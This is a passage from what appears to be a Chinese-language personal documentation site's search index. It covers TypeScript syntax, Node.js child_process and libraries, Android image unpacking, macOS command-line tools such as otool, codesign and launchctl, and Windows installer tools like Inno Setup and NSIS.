enum: 枚举 void null: 表示对象值缺失。表示一个空对象引用. 用 typeof 检测 null 返回是 object undefined: 用于初始化变量为一个未定义的值. undefined 是一个没有设置值的变量. typeof 一个没有值的变量会返回 undefined never: never 是其它类型（包括 null 和 undefined）的子类型，代表从不会出现的值。","tags":"前端","url":"/yq-docs-front-end-TypeScript-Basic-type.html","loc":"/yq-docs-front-end-TypeScript-Basic-type.html"},{"title":"ts的问号与叹号","text":"问号 ts中有四种使用方式 三目运算符 例: const isCN = country === 'China' ? true : false; 函数可选参数(可以理解为参数自动加上 undefined) 例: function getUsername(firstName: string, lastName?: string){} 类似与: function getUsername(firstName: string, lastName: string | undefined){} 可选成员（类、接口） 例: class A {\n  name?: string\n}\n\ninterface B {\n  name?: string\n} 链判断运算符（ES2020 optional chaining operator） 例: const firstName = message?.body?.user?.firstName || 'default'; 感叹号 三个地方会用到: 一元运算符:: 例: const isShow = !isModalHide(); 成员(强调非空/已有值) 例: interface B {\n  name?: string\n}\n\n// 因为接口B里面name被定义为可空的值，但是实际情况是不为空的，\n// 那么我们就可以通过在class里面使用！，重新强调了name这个不为空值\nclass A implemented B {\n  name!: string\n} TypeScript 2.7 引入了一个新的控制类型检查的标记 --strictPropertyInitialization ,\n这个参数规定每个实例属性都会在构造函数里或使用属性初始化器赋值: class Person {\n  name: string;\n  country: string;\n  constructor() {\n    this.name = 'Louis';\n  }\n} 在 strictPropertyInitialization 打开的情况下，上面的代码编译器会报错: error TS2564: Property 'country' has no initializer and is not definitely assigned in the constructor. 如果我们不想在初始化的时候为country赋值，此时就可以用 ! 修饰该属性: class Person {\n  name: string;\n  country!: string;\n  constructor() {\n    this.name = 'Louis';\n  }\n} 非空断言操作符(Non-null Assertion Operator) 在编辑器中当参数可能为空(null or undefined)时, 调用可能会有警告/错误,\n这个时候可以使用 ! 表示一定不为空(不会改变代码的运行时行为): function liveDangerously(x?: number | null) {\n  // No error\n  console.log(x!.toFixed());\n}","tags":"前端","url":"/yq-docs-front-end-TypeScript-Question-mark-and-exclamation-mark.html","loc":"/yq-docs-front-end-TypeScript-Question-mark-and-exclamation-mark.html"},{"title":"ts源码调试","text":"例如在 WebStrome 工具, 需要在 tsconfig.json 设置 sourceMap 为 true sourceMap 选项用于控制 TypeScript 编译时是否生成源码映射文件(.map 文件) sourceMap 的作用主要有: 源码调试 - sourceMap 提供了映射关系,可以在浏览器的调试工具中直接调试 TypeScript 源代码,而不是编译后的 JavaScript 代码。 错误定位 - 通过 sourceMap 定位到 TypeScript 源码中的错误位置,而不是编译后的 JavaScript 中的位置。 源码映射 - 在浏览器中可以映射回原始的 TypeScript 源码,方便调试分析。 源码压缩 - 即使 JavaScript 代码被压缩/合并/精简过,也可以使用 sourceMap 映射回原始代码。 更好的可读性 - 源码映射使得编译后的代码可读性更高。 代码转换跟踪 - sourceMap 记录了代码转换的整个过程,可以看到代码转换前后的对应关系 注解 这只是一个参考, 并不是开启了一定可以用","tags":"前端","url":"/yq-docs-front-end-TypeScript-TS-source-code-debugging.html","loc":"/yq-docs-front-end-TypeScript-TS-source-code-debugging.html"},{"title":"tsc","text":"注解 考虑过是不是直接放在linux指令下面,\n想了下只是TypeScript适用, 罢手 编译ts文件为js文件, 支持同时多个文件 安装: npm install typescript -g 选项/参数 --help 显示帮助信息 --module 载入扩展模块 --target 设置 ECMA 版本 --declaration 额外生成一个 .d.ts 扩展名的文件 如生成 ts-hw.d.ts、ts-hw.js 两个文件: tsc ts-hw.ts --declaration --removeComments 删除文件的注释 --out 编译多个文件并合并到一个输出的文件 --sourcemap 生成一个 sourcemap (.map) 文件.\nsourcemap 是一个存储源代码与编译代码对应位置映射的信息文件 --module noImplicitAny 在表达式和声明上有隐含的 any 类型时报错 --watch 在监视模式下运行编译器。会监视输出文件，在它们改变时重新编译。 tsconfig.json配置 strictPropertyInitialization 严格检查类属性是否有初始值 不知道是否是更新了ts版本的缘故, 使用依赖注入框架时候, 如果\n没给初始值, 会误报, tsconfig中配置此属性值为false, 来不进行这种检查.","tags":"前端","url":"/yq-docs-front-end-TypeScript-TSC.html","loc":"/yq-docs-front-end-TypeScript-TSC.html"},{"title":"TypeScript 函数","text":"可选参数 可选参数: function buildName(firstName: string, lastName?: string) {\n    if (lastName)\n        return firstName + \" \" + lastName;\n    else\n        return firstName;\n} lastName加问号表示是一个可选参数, 可选参数必须跟在必需参数后面, 也可以直接给一个默认值: function function_name(param1[:type],param2[:type] = default_value) {\n} 剩余参数 使用 ... , 类似Python的 *args 有一种情况，我们不知道要向函数传入多少个参数，这时候我们就可以使用剩余参数来定义。\n剩余参数语法允许我们将一个不确定数量的参数作为一个数组传入: function buildName(firstName: string, ...restOfName: string[]) {\n    return firstName + \" \" + restOfName.join(\" \");\n}\n\nlet employeeName = buildName(\"Joseph\", \"Samuel\", \"Lucas\", \"MacKinzie\");","tags":"前端","url":"/yq-docs-front-end-TypeScript-function.html","loc":"/yq-docs-front-end-TypeScript-function.html"},{"title":"内置对象","text":"process process 是 Node.js 环境中的一个全局对象，提供了与当前进程相关的信息和功能。\n它不是在浏览器环境下使用的，而是在 服务器端或命令行环境 下使用的。 process 对象包含了许多属性和方法，用于获取和操作与当前进程相关的信息。\n以下是一些常用的 process 属性和方法： process.argv 返回一个包含命令行参数的数组。 第一个元素是 Node.js 的可执行文件路径; 第二个元素是当前执行的 JavaScript 文件路径; 后续元素是传递给脚本的命令行参数 process.env 返回一个包含当前进程环境变量的对象。 process.cwd() 返回当前工作目录的路径。 process.exit([code]) 终止当前进程的执行。可选的 code 参数用于指定进程的退出状态码。 process.pid 返回当前进程的进程 ID。 process.platform 返回一个表示当前操作系统平台的字符串。 process.stdout 和 process.stderr 提供对标准输出和标准错误输出流的访问。","tags":"前端","url":"/yq-docs-front-end-node-Built--in-object.html","loc":"/yq-docs-front-end-node-Built--in-object.html"},{"title":"node启动常见参数","text":"--remote-debug-port= <port> 旧版调试参数; 使用旧的 Legacy 协议,功能较少 --inspect= <port> 新版支持调试参数;\n当使用node时, 有时候需要启动断点调试功能,\n这个时候可以使用此参数, 然后在这个端口进行调试;\n可以在 Chrome 浏览器中通过 chrome://inspect 访问调试地址 --inspect-brk= <port> 当使用node时, 有时候需要启动断点调试功能,\n这个时候可以使用此参数, 然后在这个端口进行调试; 与 --inspect 相比, 会在启动时暂停 端口调试工具 WebStorm VS VSCode WebStorm仅支持单个端口的调试: 而VSCode支持多端口同时多断点启动:","tags":"前端","url":"/yq-docs-front-end-node-Node-starts-common-parameters.html","loc":"/yq-docs-front-end-node-Node-starts-common-parameters.html"},{"title":"child_process","text":"官网:: Child Process 子进程操作相关模块 创建子进程方式: spawn :  启动一个子进程来执行命令； exec :  启动一个子进程来执行命令，与 spawn 不同的是，它有一个回调函数获知子进程的状况； execFile : 启动一个子进程来执行可执行文件； fork :  与 spawn 类似，不同点在于它创建 Node 的子进程只需指定要执行的 JavaScript 文件模块即可； 注解 exec , execFile , fork 底层都是通过 spawn 实现 spawn child_process.spawn(command[, args][, options]) command: string 要执行的命令, 实际还是可执行文件； args: string[] 字符串参数列表； options: {} argv0: string 显式地设置发送给子进程的 argv[0] 的值， 如果没有指定，则会被设置为 command 的值； detached: Boolean 让子进程独立于父进程之外运行； 其他: options exec child_process.exec(command[, options][, callback]) 创建一个 shell，然后在 shell 里执行命令。执行完成后，将 stdout、stderr 作为参数传入回调方法 options支持参数: cwd: 当前工作路径； env: 环境变量； encoding: 编码，默认是 utf8； shell: 用来执行命令的 shell，unix 上默认是 /bin/sh，windows 上默认是 cmd.exe； timeout: 默认是 0；当子进程运行超过 timeout 毫秒，那么，就会给进程发送 killSignal 指定的信号（比如 SIGTERM） killSignal: 默认是 SIGTERM； uid: 执行进程的 uid； gid: 执行进程的 gid； maxBuffer:  标准输出、错误输出最大允许的数据量（单位为字节），如果超出的话，子进程就会被杀死；默认是 200*1024（即 200k ） 基本使用: const {exec} = require('child_process');\n\nexec('ls', (error, stdout, stderr) => {\n    // do ...\n}); 其中, (error, stdout, stderr) 对应类型如下: error: ExecException | null,\n        // ExecException只是一个接口, 通用属性有四个:\n        // cmd?: string | undefined;\n        // killed?: boolean | undefined;\n        // code?: number | undefined;\n        // signal?: NodeJS.Signals | undefined;\nstdout: str,\nstderr: str, 高级一点用法, 对输出进行监听: exec('ls').stdout.on('data', data => {\n    console.log(data);\n}); execFile child_process.execFile(file[, args][, options][, callback]) 跟 exec 类似，不同点在于，没有创建一个新的 shell，options 参数与 exec 一样 file: string 实际是可执行文件, 比如 ping, ls options: options 例: const child_process = require('child_process');\n\nchild_process.execFile('ls', ['./'], (error, stdout, stderr) => {\n    /// do ...\n    console.log(error, stdout, stderr);\n}); fork child_process.fork(modulePath[, args][, options]) modulePath: string | URL 子进程运行的模块； args: string[] 字符串参数列表； options: {} 支持的参数列表, 有以下参数, 基本与 spawn 一致 cwd: str 当前工作路径； detached: boolean 让子进程独立于父进程之外运行； env: object 环境变量； execArgv: string[] 传给可执行文件的字符串参数列表。默认是 process.execArgv，跟父进程保持一致； execPath: string 用来创建子进程的可执行文件，默认是 /usr/local/bin/node。也就是说，你可通过 execPath 来指定具体的 node 可执行文件路径；（比如多个 node 版本） gid: number 执行进程的 gid； killSignal: string|number 默认是 SIGTERM； serialization: string 序列化 signal: AbortSingal . silent: boolean 默认是 false，即子进程的 stdio 从父进程继承。如果是 true，则直接 pipe 向子进程的child.stdin、child.stdout 等； stdio: Any[] | string 选项用于配置在父进程和子进程之间建立的管道，如果声明了 stdio，则会覆盖 silent 选项的设置； 如父子进程共用一个输出管道: stdio: 'inherit' timeout: number 默认是 0；当子进程运行超过 timeout 毫秒，那么，就会给进程发送 killSignal 指定的信号（比如 SIGTERM） uid: number 执行进程的 uid； 支持的事件 close 事件: 子进程的 stdio 流关闭时触发； disconnect 事件: 事件在父进程手动调用 child.disconnect 函数时触发； error 事件: 产生错误时会触发； exit 事件: 子进程自行退出时触发； message 事件: 它在子进程使用 process.send() 函数来传递消息时触发； 事件使用 on 调用: exec('ls').stdout.on('exit', (code, signal) => {\n    console.log(code);\n});","tags":"前端","url":"/yq-docs-front-end-node-Standard-library-Child_prCess.html","loc":"/yq-docs-front-end-node-Standard-library-Child_prCess.html"},{"title":"ajv","text":"json-schema: 用来描述 json 长什么样数据格式 ajv 是一个校验 json-schema 的数据格式工具 json-schema 默认含有下面 6 种数据结构 string number object array boolean null 使用用例: const Ajv = require(\"ajv\")\nconst ajv = new Ajv()\n\nconst schemaStr = '{\"type\":\"object\",\"description\":\"Windows specific launch configuration attributes.\",\"properties\":{\"env\":{\"additionalProperties\":{\"type\":\"string\"},\"default\":{},\"description\":\"Environment variables defined as a key value pair. Property ends up being the Environment Variable and the value of the property ends up being the value of the Env Variable.\",\"type\":\"object\",\"pattern\":\"&#94;(?!.*\\\\\\\\$\\\\\\\\{(env|config|command)\\\\\\\\.)\",\"patternErrorMessage\":\"\\'env.\\', \\'config.\\' and \\'command.\\' are deprecated, use \\'env:\\', \\'config:\\' and \\'command:\\' instead.\"}},\"pattern\":\"&#94;(?!.*\\\\\\\\$\\\\\\\\{(env|config|command)\\\\\\\\.)\",\"patternErrorMessage\":\"\\'env.\\', \\'config.\\' and \\'command.\\' are deprecated, use \\'env:\\', \\'config:\\' and \\'command:\\' instead.\"}'\n\nconst schema = JSON.parse(schemaStr)\n// const schema = {\n//   type: \"object\",\n//   description: 'test o',\n//   properties: {\n//     env: {\n//       additionalProperties: {type: 'string'},\n//       default: {},\n//       description: 'env o',\n//       type: 'object',\n//       pattern: \"&#94;(?!.*\\\\$\\\\{(env|config|command)\\\\.)\"\n//     }\n//   },\n//   pattern: \"&#94;(?!.*\\\\$\\\\{(env|config|command)\\\\.)\"\n// }\n\nconst data = {env: {\"1\": \"1\"}}\n// const valid = ajv.validate(schema, data)\nconst validRule = ajv.compile(schema)\nconst valid = validRule(data)\nif (!valid) console.log(ajv.errors); else console.log('suc', valid)","tags":"前端","url":"/yq-docs-front-end-node-Three--party-library-AJV.html","loc":"/yq-docs-front-end-node-Three--party-library-AJV.html"},{"title":"AnchorJS","text":"针对文档项目的索引吧. 官网: anchorjs-doc 安装/使用 npm: // npm install anchor-js\n\nimport AnchorJS from 'anchor-js';\nconst anchors = new AnchorJS();\nanchors.add(); cdn: <script src=\"https://cdn.jsdelivr.net/npm/anchor-js/anchor.min.js\"></script>\n<script>\n  anchors.add();\n</script> js file: import 'https://cdn.jsdelivr.net/npm/anchor-js/anchor.min.js';\n\nanchors.add(); 一些方法 anchors.add() 将一些链接加入以便便捷查找. 参数为 css选择器 字符串. 比如: h1\n.title  // 类选择器 多个合并为一个字符串, 使用逗号分隔. 当不带参数时, 默认寻找: h2, h3, h4, h5, h6 建议在文档全部加载完成之前使用: <!-- Add anchors before the closing body tag. -->\n  <script>\n    anchors.add();\n  </script>\n</body> 或者: // Add anchors on DOMContentLoaded\ndocument.addEventListener('DOMContentLoaded', function(event) {\n  anchors.add();\n});","tags":"前端","url":"/yq-docs-front-end-node-Three--party-library-Anchorjs.html","loc":"/yq-docs-front-end-node-Three--party-library-Anchorjs.html"},{"title":"lodash","text":"节流与消抖 节流(throttle): n 秒内只运行一次，若在 n 秒内重复触发，只有一次生效 消抖(debounce): n 秒后在执行该事件，若在 n 秒内被重复触发，则重新计时 参考: https://vue3js.cn/interview/JavaScript/debounce_throttle.html#代码实现 重要 此库提供的节流与消抖, 是一个回调而不是函数调用. 类似于: const Sleep = (ms: number)=> {\n  return new Promise(resolve=>setTimeout(resolve, ms))\n}\n\nconst debounce = async (func, wait: number) => {\n  if (typeof func !== 'function') {\n    throw new TypeError('Expected a function')\n  }\n\n  // 等待 xxx ms\n  await Sleep(wait);\n  return func\n} 这里的代码其实有点问题, 没有实现到 重复触发，重新计时 lodash用于节流(throttle)函数的调用频率,以提高性能。 限制指定的时间间隔内最多执行一次原函数。也就是说,它限制了调用函数的频率,避免函数被过于频繁地调用。 使用 lodash.throttle 的好处有: 防止频繁的事件触发导致性能问题,如 resize、scroll 等事件的处理函数。 控制动画或轮询功能的频率,避免过度占用 CPU 资源。 网络请求频率控制,减少不必要的请求量。 输入框实时搜索suggestions时限制请求频率。 例如: import { throttle } from 'lodash';\n\nfunction handleResize() {\n  // 处理窗口 resize\n}\n\nwindow.addEventListener('resize', throttle(handleResize, 100)); 这将限制 handleResize 函数每 100ms 至多执行一次,从而提高页面滚动时的性能。","tags":"前端","url":"/yq-docs-front-end-node-Three--party-library-lodash.html","loc":"/yq-docs-front-end-node-Three--party-library-lodash.html"},{"title":"nodejs下载安装","text":"官网全版本node地址: https://nodejs.org/dist","tags":"前端","url":"/yq-docs-front-end-node-node-download-and-install.html","loc":"/yq-docs-front-end-node-node-download-and-install.html"},{"title":"镜像文件解包","text":"系统: Mac 用到的工具. simg2img lpunpack 其中 simg2img 直接brew安装即可: brew install simg2img lpunpack 就需要自行去github上找了, 需要找了自己编 第一次找了个c++的, 本地没有编过, 然后找了个py的, 看起来可以, 地址: https://github.com/unix3dgforce/lpunpack 大致用法, 用的是 Redmi K60 的国行线刷包, 下载的文件是官方的tgz格式,\n解压后可以找到image下main的 super.img 文件(当前安卓规定的动态分区文件). 可以file查看文件格式: file super.img\nsuper.img: Android sparse image, version: 1.0, Total of 2228224 4096-byte output blocks in 141 input chunks. 是 sparse image , 需要使用 simg2img 转换为 raw: simg2img super.img super_raw.img 查看是否成功: file super_raw.img\nsuper_raw.img:: data 成功 然后解压分区镜像(我新建了一个data目录放在下面): python3 lpunpack.py super_raw.img data/ 结果: file data/*\ndata/mi_ext_a.img:          data\ndata/mi_ext_b.img:          empty\ndata/odm_a.img:             data\ndata/odm_b.img:             empty\ndata/product_a.img:         data\ndata/product_b.img:         empty\ndata/system_a.img:          data\ndata/system_b.img:          empty\ndata/system_ext_a.img:      data\ndata/system_ext_b.img:      empty\ndata/vendor_a.img:          data\ndata/vendor_b.img:          empty\ndata/vendor_dlkm_a.img:     data\ndata/vendor_dlkm_b.img:     empty 这里的img文件就是 ext4 格式的镜像了,\n最简单的打开方式就是使用linux挂载,\n一开始找了很久怎么在Win/Mac系统打开, 都失败了, 最终还是拿到虚拟机去挂载打开的. 注解 windows下的话有个仓库的 simg2img 可以用: https://github.com/KinglyWayne/simg2img_win 里面的ext2不能用.","tags":"操作系统","url":"/yq-docs-operating-system-Android-Mirror-file-dissection-package.html","loc":"/yq-docs-operating-system-Android-Mirror-file-dissection-package.html"},{"title":"otool","text":"某种程度上可以看作 ldd 的替代,\n因为Mac上没有 ldd 指令. iOS应用所依赖的系统库检查 otool(object file displaying tool) 针对目标文件的展示工具，用来发现应用中使用到了哪些系统库，调用了其中哪些方法，\n使用了库中哪些对象及属性，它是Xcode自带的常用工具。 常用的命令: -f print the fat headers\n-a print the archive header\n-h print the mach header\n-l print the load commands\n-L 打印用到的 shared libraries, 就是看用到了哪些动态库\n-D print shared library id name\n-t 打印汇编的text段, 一般需要与-v一起使用(the text section (disassemble with -v))\n-p <routine name>  start dissassemble from routine name\n-s <segname> <sectname> print contents of section\n-d print the data section\n-o print the Objective-C segment\n-r print the relocation entries\n-S print the table of contents of a library\n-T print the table of contents of a dynamic shared library\n-M print the module table of a dynamic shared library\n-R print the reference table of a dynamic shared library\n-I print the indirect symbol table\n-H print the two-level hints table\n-G print the data in code table\n-v print verbosely (symbolically) when possible\n-V 打印反汇编符号操作数(disassembled operands symbolically)\n-c print argument strings of a core file\n-X print no leading addresses or headers\n-m don't use archive(member) syntax\n-B force Thumb disassembly (ARM objects only)\n-q use llvm's disassembler (the default)\n-Q use otool(1)'s disassembler\n-mcpu=arg use `arg' as the cpu for disassembly\n-j print opcode bytes\n-P print the info plist section as strings\n-C print linker optimization hints\n--version print the version of /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/otool","tags":"操作系统","url":"/yq-docs-operating-system-Mac-MAC-instruction-Otool.html","loc":"/yq-docs-operating-system-Mac-MAC-instruction-Otool.html"},{"title":"security","text":"访问钥匙串 如: security find-identity -v -p codesigning","tags":"操作系统","url":"/yq-docs-operating-system-Mac-MAC-instruction-Security.html","loc":"/yq-docs-operating-system-Mac-MAC-instruction-Security.html"},{"title":"codesign","text":"创建和管理证书 用法: codesign -s identity [-fv*] [-o flags] [-r reqs] [-i ident] path ...    # 签名\ncodesign -v [-v*] [-R=<req string>|-R <req file path>] path|[+]pid ...  # 验证\ncodesign -d [options] path ...          # 内容显示\ncodesign -h pid ...                     # 主机路径显示\ncodesign --validate-constraint path ... # 检查提供的约束plist (check the supplied constraint plist) 说明: -s 签名 -f force, 强制重新签名 -i 表示修改签名参数 Identifier -o 修改flags -d 是display展示签名信息的意思 -v 是verbose的意思，越多的verbose显示信息越多，通常3个就已经足够了 -vvv --entitlements 授权机制 entitements信息 查看WeChat的签名: codesign -d -vvv WeChat.app 参考: codesign的使用","tags":"操作系统","url":"/yq-docs-operating-system-Mac-MAC-instruction-codeSign.html","loc":"/yq-docs-operating-system-Mac-MAC-instruction-codeSign.html"},{"title":"gs","text":"ghostscript命令 专门用于处理.ps文件以及PDF相关的文件, 文件直接转换, 质量高 只是简单的可以就使用 sips","tags":"操作系统","url":"/yq-docs-operating-system-Mac-MAC-instruction-company.html","loc":"/yq-docs-operating-system-Mac-MAC-instruction-company.html"},{"title":"convert","text":"安装: brew install imagemagick 与 sips 差不多 convert 是 imagemagick 程序包的命令,\nconvert 其实等价于 magick 执行转换命令只需要传入待转换的图片以及输出的图片文件名即可: convert aa.eps a.ico 支持几乎所有的位图/矢量图格式. 美中不足的一点就是转换的图片质量不高, pdf转png会丢失背景 参考: https://blog.csdn.net/qq_41437512/article/details/122619375","tags":"操作系统","url":"/yq-docs-operating-system-Mac-MAC-instruction-convert.html","loc":"/yq-docs-operating-system-Mac-MAC-instruction-convert.html"},{"title":"launchctl","text":"MacOS不像 Linux 有 /etc/init.d/rc.local 以及 service 的方式可以设置程序随机启动，\n而是使用 plist 文件管理. 你可以写一个plist文件放到 ~/Library/Launch Agents/ 下面，\n文件里描述你的程序路径和启动参数，\n那么这个用户登录时就会启动这个程序了，而且是杀不了的，被杀了之后会自动重新启动 plist文件分布在: /System/Library/LaunchDaemons/\n    System-wide daemons provided by OS X\n    其中 apache的httpd程序启动配置文件 org.apache.httpd.plist 就在这里。\n/System/Library/LaunchAgents/\n    由Mac OS X为用户定义的任务项\n/Library/LaunchDaemons\n    由管理员定义的守护进程任务项\n/Library/LaunchAgents\n    由管理员为用户定义的任务项\n    如果放到/Library/Launch Agents/下面的话，就是一开机就启动\n~/Library/LaunchAgents\n  由用户自己定义的任务 这些配置文件由程序 launchctl 设置是否加载 说明 launchctl 管理 MacOS 的启动脚本，控制启动计算机时需要开启的服务.\n也可以设置定时执行特定任务的脚本，就像Linux cron 一样. launchctl需要root权限。 常用命令 显示当前的启动脚本: launchctl list 开机时自动启动Apache服务器: sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist 设置开机启动并立即启动改服务: launchctl load -w   **.pist 设置开机启动但不立即启动服务: launchctl load **.pist 停止正在运行的启动脚本: sudo launchctl unload [path/to/script] 再加上-w选项即可去除开机启动: sudo launchctl unload -w [path/to/script] 执行定时脚本|设置开机启动步骤: 1. 写执行脚本 （通过 brew 安装软件 brew 会为我们自动生成。）\n2. 去对应的目录下建立plist文件\n3. 加载服务\n    > 1 cd 进入指定 plist 文件目录\n    > 2 launchctl load *.plist #加载\n        launchctl unload *.plist #取消\n    > 3 launchctl list #查看服务 还可设置别名便于操作: 1. vim ~/.bash_profile #编辑添加如下脚本\n2. 命名别名（以 nginx 为例）\n    > 启动：alias nginx.start='launchctl load -w ~/Library/LaunchAgents/homebrew.mxcl.nginx.plist'\n    > 关闭：alias nginx.stop='launchctl unload -w ~/Library/LaunchAgents/homebrew.mxcl.nginx.plist'\n    > 重启：alias nginx.restart='nginx.stop && nginx.start' 注解 在launchctl list 命令结果中出现的 plist 文件才会有效; Agents文件夹下的plist是需要用户登录后，才会加载的，\n而Daemons文件夹下得plist是只要开机，可以不用登录就会被加载 参考: MacOS launchctl 启动进程控制 用例-查找docker进程并关闭 list查找然后关闭和启动它: $ launchctl list | grep docker\n111117   0       com.docker.docker.2388\n$ launchctl stop com.docker.docker.2388 && launchctl start com.docker.docker.2388","tags":"操作系统","url":"/yq-docs-operating-system-Mac-MAC-instruction-launchctl.html","loc":"/yq-docs-operating-system-Mac-MAC-instruction-launchctl.html"},{"title":"xcrun","text":"查看sdk路径: $ xcrun --sdk macosx --show-sdk-path\n/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX14.2.sdk","tags":"操作系统","url":"/yq-docs-operating-system-Mac-MAC-instruction-xcrun.html","loc":"/yq-docs-operating-system-Mac-MAC-instruction-xcrun.html"},{"title":"DYLD_INSERT_LIBRARIES","text":"可以用来执行程序运行前首先加载的动态库,\n多个使用冒号分割,\n与Linux的 LD_PRELOAD 基本一致","tags":"操作系统","url":"/yq-docs-operating-system-Mac-Mac-environment-variable-Dyld_insert_libraries.html","loc":"/yq-docs-operating-system-Mac-Mac-environment-variable-Dyld_insert_libraries.html"},{"title":"DYLD_PRINT_LIBRARIES","text":"设置值为1后, 执行程序之前会打印出运行时加载的所有动态库 用例: $ DYLD_PRINT_LIBRARIES=1 ./test2\n\n// 这部分是运行时加载的动态库, 篇幅较长, 此处只截取头尾\ndyld[43741]: <DD3BA6F6-FA28-3A28-AA7D-F95D176C25B3> /Users/yanque/project/code/TryTest/test2\ndyld[43741]: <683DEB82-6E72-394B-945D-AB3A1A8BE1D8> /Users/yanque/project/code/TryTest/libtest2preutil.dylib\n...\ndyld[43741]: <6F11E645-DB1C-325D-AC28-91740663E4DD> /usr/lib/system/libxpc.dylib\ndyld[43741]: <7E3B4177-738A-305C-93AA-D9E395B96B9D> /usr/lib/libobjc.A.dylib\ndyld[43741]: <87B41A1F-8387-3AF3-BB41-C86D4B6A21A5> /usr/lib/liboah.dylib\n\n// 下面是执行结果\na + b + 随机值= 10000 + 10090 + 3 = 0\n交换a, b的值, 交换前: a: 10000; b: 10090\n交换a, b的值, 交换后: a: 10090; b: 10000","tags":"操作系统","url":"/yq-docs-operating-system-Mac-Mac-environment-variable-Dyld_print_libraries.html","loc":"/yq-docs-operating-system-Mac-Mac-environment-variable-Dyld_print_libraries.html"},{"title":"Mac-Vmware磁盘修复","text":"Mac下面个人免费的虚拟机好像只有Vmware的 Vmware Fusion , 有时候由于磁盘空间不足啊等原因可能会\n造成 指定的虚拟磁盘需要修复 这个时候好像重启Vmware就可以修复. 若不行: cd /Applications/VMware\\ Fusion.app/Contents/Library/\n./vmware-vdiskmanager -R \"/Users/yanque/Virtual Machines.localized/Ubuntu 64 位 14.04.6.vmwarevm/虚拟磁盘.vmdk\"","tags":"操作系统","url":"/yq-docs-operating-system-Mac-Mac-vmware-disk-repair.html","loc":"/yq-docs-operating-system-Mac-Mac-vmware-disk-repair.html"},{"title":"打印运行时加载的动态库","text":"运行前设置环境变量 DYLD_PRINT_LIBRARIES=1 详见: DYLD_PRINT_LIBRARIES","tags":"操作系统","url":"/yq-docs-operating-system-Mac-The-dynamic-library-loaded-when-printing-runtime.html","loc":"/yq-docs-operating-system-Mac-The-dynamic-library-loaded-when-printing-runtime.html"},{"title":"关于安卓模拟器与WSL冲突","text":"参考:: https://blog.csdn.net/weixin_42474261/article/details/125396451 https://www.zhihu.com/question/264353707 wsl Hyper-V 与 安卓模拟器虚拟机同时共存方案 冲浪了一下大概就几种方案: 最新的雷电9已经解决了兼容性问题, 支持共存. 参考: wsl Hyper-V 与 安卓模拟器虚拟机同时共存方案 下载新版 BlueStacks (蓝叠) 国际版. 下载地址: BlueStacksFullInstaller_5.9.410.1001_amd64_native","tags":"操作系统","url":"/yq-docs-operating-system-Windows-About-Android-simulator-conflict-with-WSL.html","loc":"/yq-docs-operating-system-Windows-About-Android-simulator-conflict-with-WSL.html"},{"title":"innosetup构建包","text":"github地址:: jrsoftware/issrc innosetup 是适用于windows的一个免费windows安装程序制作软件. 对于打好的包, 支持不关闭应用程序的静默安装等操作. 配置脚本 innosetup 支持的配置文件为 iss 后缀的文件. 看到一个比较新的中文的配置教程: Inno Setup打包程序 截取了部分: innosetup_code_example 支持的配置: [Setup] section\n[Setup] section directives\n[Types] section\n[Components] section\n[Tasks] section\n[Dirs] section\n[Files] section\n[Icons] section\n[INI] section\n[InstallDelete] section\n[Languages] section\n[Messages] section\n[CustomMessages] section\n[LangOptions] section\n[Registry] section\n[Run] section\n[UninstallDelete] section\n[UninstallRun] section 详情见官网: setup script sections <https://jrsoftware.org/ishelp/index.php?topic=consts> 自定义配置代码 若需要加代码之类, 需要增加 [code] 小节, 在其中编码, 支持设置自己的参数. 如, vscode自定义了一个 /update 参数, 使用时候传入标志文件路径: VSCodeUserSetup-x64-1.76.0.exe /verysilent /update=VSCodeUserSetup-x64-1.76.0.flag /nocloseapplications /mergetasks=runcode,!desktopicon,!quicklaunchicon 在代码中获取 /update 的参数, 获取不到则为 false '{param:update|false}' code部分编码语言参考 Pascal (上古语言) 安装包默认支持的参数 官网地址:: Setup Command Line Parameters 对于构建好的包, 启动时支持参数: /silent             静默安装，但如果又报错，还是会提示，并且有进度条\n/verysilent         强制静默安装，不管是否报错，都不会有任何提示(注意：如果需要重启电脑，它会不提示而直接重启)\n/suppressmsgboxes   由 suppress(抑制，镇压) 和 msgboxes(消息框)，组成，表示不提示消息框\n/norestart          结合 /verysilent 使用，避免无提示直接重启\n\n/HELP, /?           查看帮助文档\n/SP-                隐藏安装提示信息(setup prompt)\n/ALLUSERS           管理员身份安装\n/CURRENTUSER        非管理员身份安装\n/LOG=\"filename\"     创建安装日志文件. 可不带参数, 则在用户的 Temp 目录下创建日志文件, debug的时候用处大\n/TASKS=\"comma separated list of task names\"\n                    执行定义的task\n/MERGETASKS=\"comma separated list of task names\"\n                    貌似于上一个一样\n\n... 其他见官网 附件 innosetup 配置脚本例 一些有点用的文档, 主要是还没来得及看, 先记录: python项目构建: Python_Project_nuitka_inno_setup inno setup技巧篇 软件exe打包压缩常用静默安装参数 常用软件的静默安装参数，双击自动安装 常用软件打包类型及静默安装参数","tags":"操作系统","url":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-InnOSetup-builds-a-package.html","loc":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-InnOSetup-builds-a-package.html"},{"title":"NSIS 内置函数","text":"GetTime获取时间 有9个参数, 获取当前本地时间或者文件时间. 语法: ${GetTime} \"[File]\" \"[Option]\" $var1 $var2 $var3 $var4 $var5 $var6 $var7\n\n\"[File]\"        ; Ignored if \"L\" or \"LS\"\n                ;\n\"[Option]\"      ; [Options]\n                ;   L   Local time\n                ;   A   last Access file time\n                ;   C   Creation file time\n                ;   M   Modification file time\n                ;   LS  System time (UTC)\n                ;   AS  last Access file time (UTC)\n                ;   CS  Creation file time (UTC)\n                ;   MS  Modification file time (UTC)\n                ;\n$var1           ; Result1: day\n$var2           ; Result2: month\n$var3           ; Result3: year\n$var4           ; Result4: day of week name\n$var5           ; Result5: hour\n$var6           ; Result6: minute\n$var7           ; Result7: seconds eg: Section\n  ${GetTime} \"\" \"L\" $0 $1 $2 $3 $4 $5 $6\n  ; $0=\"01\"      day\n  ; $1=\"04\"      month\n  ; $2=\"2005\"    year\n  ; $3=\"Friday\"  day of week name\n  ; $4=\"16\"      hour\n  ; $5=\"05\"      minute\n  ; $6=\"50\"      seconds\n\n  MessageBox MB_OK 'Date=$0/$1/$2 